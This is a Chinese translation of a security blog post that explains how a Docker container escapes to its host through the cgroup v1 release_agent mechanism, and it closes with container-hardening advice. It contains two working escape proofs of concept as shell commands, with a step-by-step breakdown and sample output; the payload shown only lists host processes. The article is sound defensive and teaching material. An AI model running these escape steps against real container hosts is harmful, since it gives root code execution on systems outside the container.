介绍Docker容器逃逸的技术，POC和防治手段。

译自：https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/

Trail of Bits最近完成了Kubernetes的安全评估，包含它和Docker的互动。Felix Wilhelm最近关于“容器逃逸”PoC的推文引起了我们的兴趣，毕竟我们也做了类似研究，非常好奇这个PoC怎样能够冲击Kubernetes.

Felix的推文展示一个PoC，它从一个使用--privileged标志运行的Docker容器里面启动宿主机的进程。这个PoC是通过滥用第一版Linux cgroup的notification on release特性来达到目的。

这是一版在宿主机启动ps的PoC：

# spawn a new container to exploit via:
# docker run --rm -it --privileged ubuntu bash
 
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o; echo $t/c >$d/release_agent;printf '#!/bin/sh\nps >'"$t/o" >/c;
chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o

--privileged标志引入严重安全隐患，且POC依赖于使用该标志启动的Docker容器。当使用这个标志，容器可以完全访问所有设备，也不受seccomp, AppArmor和Linux功能的限制。

不要使用--privileged运行容器。Docker包括独立控制容器权限的粒度设置。在各种案例中，这些至关重要的安全设置经常被遗忘。明白这些选项如何工作来加固容器是非常必要的。

在接下来的章节，将详细介绍“容器逃逸”的工作原理，它依赖的非安全设置和开发者应该做什么。

该技术的要求

事实上，--privileged提供的权限远远超过通过此方法退出停靠容器所需的权限。在现实中，“唯一”的要求是：

  1. 在容器以root身份运行
  2. 容器应该使用SYS_ADMIN功能运行
  3. 容器必须缺少AppArmor配置文件，或允许mount系统调用
  4. 第一版cgroup的虚拟文件系统在容器以可读写模式加载

SYS_ADMIN功能允许容器可以使用mount系统调用。Docker默认以一组受限的功能启动容器，且基于安全风险考虑不会启用SYS_ADMIN能力。

并且，Docker默认使用docker-default的AppArmor策略启动容器，即使容器使用SYS_ADMIN运行，这个策略也会禁止使用mount系统调用。

一个容器如果使用下列标记启动--security-opt apparmor=unconfined --cap-add=SYS_ADMIN，它就很容易受到这种技术的攻击。

使用cgroups传送PoC

Linux cgroups是Docker用于隔离容器的原理之一。PoC滥用第一版croups中的notify_on_release功能，以完全授权的超级用户身份运行利用漏洞攻击。

当一个cgroup最后一个任务结束（退出或附加到另一个cgroup)，在release_agent文件提供的一个命令会执行。它的目的是为了清除那些弃用的cgroup。一旦执行，这个命令是以完全授权超级用户身份在宿主机上运行。

1.4 notify_on_release是做什么的？

如果一个cgroup启用了notify_on_release标志，当这个cgroup最后一个任务结束（退出或附加到其它cgroup)，且它最后一个子cgroup被删除，然后内核会运行该层次根目录下的release_agent文件内容指定的命令，提供弃用cgroup的目录（相对于cgroup文件系统的挂载点）。这使得弃用cgroup的自动清理。系统启动时，根cgroup的notify_on_release的默认值是禁用(0)。其它cgroup该标志在创建时的默认值是它们父cgroup的notify_on_release设置。一个cgroup层次release_agent路径默认值为空。

--来自https://www.kernel.org/doc/Documentation/cgroup-v1/cgroups.txt

完善PoC

有一个更简单的方法写这个PoC，使得它在没有--privileged标志的情况下工作。这个场景无法访问一个由--privileged提供的可读写cgroup挂载。但这个场景可以很容易适应：自己以可读写方式挂载cgroup。这样额外加多一行到PoC，却需要更少的权限。

下面PoC会在宿主机上执行ps aux，把结果输出到容器里的/output文件。和原始PoC一样，它使用同样release_agent特性在宿主机上执行。

# On the host
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
 
# In the container
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
 
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
 
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
 
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

分散PoC

既然已经知道使用这个技术的要求，也已经完善了PoC，现在一行一行地详细介绍它的工作原理。

要触发这个攻击，需要一个cgroup，在它上面可以创建一个release_agent文件和通过杀死里面所有进程来触发release_agent操作。最简单方法是挂载一个cgroup控制器和创建一个子cgroup。

要达到这个目的，创建一个/tmp/cgrp目录，挂载RDMA cgroup控制器和创建一个子cgroup（这里命令它为x）。

如果在挂载时遇到mount: /tmp/cgrp: special device cgroup does not exist，这是因为设置里没有RDMA cgroup控制器。把rdma改为memory。这里使用RDMA是因为原初的PoC是使用它。

cgroup控制器是全局资源，可以使用不同许可挂载多次，每个挂载的变动都会传递给另外的。

可以看到x子cgroup创建，查看一下它的目录

接着，通过把1写到x cgroup的notify_on_release文件来启用它的释放通知。同时将RDMA cgroup释放代理设置为执行/cmd脚本(稍后我们将在容器中创建该脚本)，方法是将主机上的/cmd脚本路径写入release_agent文件。为此，从/etc/mtab获取容器在主机上的路径。

这些在容器上增加和修改的文件在宿主机上展示，也可以从两边来修改它们：从容器里的目录和在宿主机的目录。

操作如下

root@b11cf9eab4fd:/# echo 1 > /tmp/cgrp/x/notify_on_release
root@b11cf9eab4fd:/# host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
root@b11cf9eab4fd:/# echo "$host_path/cmd" > /tmp/cgrp/release_agent

请注意将在宿主机上创建的/cmd脚本的路径：

现在，创建/cmd脚本，以便它将执行ps aux命令，并通过指定输出文件在宿主机上的完整路径把结果保存到容器上的/output中。最后，打印/cmd脚本以查看其内容：

root@b11cf9eab4fd:/# echo '#!/bin/sh' > /cmd
root@b11cf9eab4fd:/# echo "ps aux > $host_path/output" >> /cmd
root@b11cf9eab4fd:/# chmod a+x /cmd
root@b11cf9eab4fd:/# cat /cmd

ps aux > /var/lib/docker/overlay2/7f4175c90af7c54c878ffc6726dcb125c416198a2955c70e186bf6a127c5622f/diff/output

安全地使用容器

Docker默认限制容器。放松这些限制会产生安全问题，即使没有达到--privileged的权限。认识到每种附加权限的影响和总体限制权限到最小需求是非常重要的。

下面是容器安全的建议：

  • 不要使用--privileged标志或者在容器内部挂载Docker socket。Docker socket允许启动容器，所以它很容易完全控制宿主机，比如，使用--privileged标志运行另外一个容器。
  • 不要在容器里以root身份运行。使用另外一个用户或另外一个用户命名空间。没有重新映射用户命名空间，root在容器和在宿主机是一样的，只是稍微由Linux命名空间，功能和cgroups限制。
  • 丢弃所有Linux功能(--cap-drop=all)，只启用那些必需的(--cap-add=)。许多工作并不需要任何Linux功能，启用它们只会增加潜在风险
  • 使用no-new-privilegeds安全选项防止进程获取更多权限，比如通过suid二进制文件
  • 限制容器的资源。资源限制可以防止宿主机遭受DoS攻击。
  • 调整seccomp, AppArmor（或SELinux)配置来限制容器可用的操作和系统调用到最小化程度
  • 使用Docker官方镜像或者基于它们创建自己的镜像，不要继承或使用有后门的镜像。
  • 经常打补丁来重建镜像
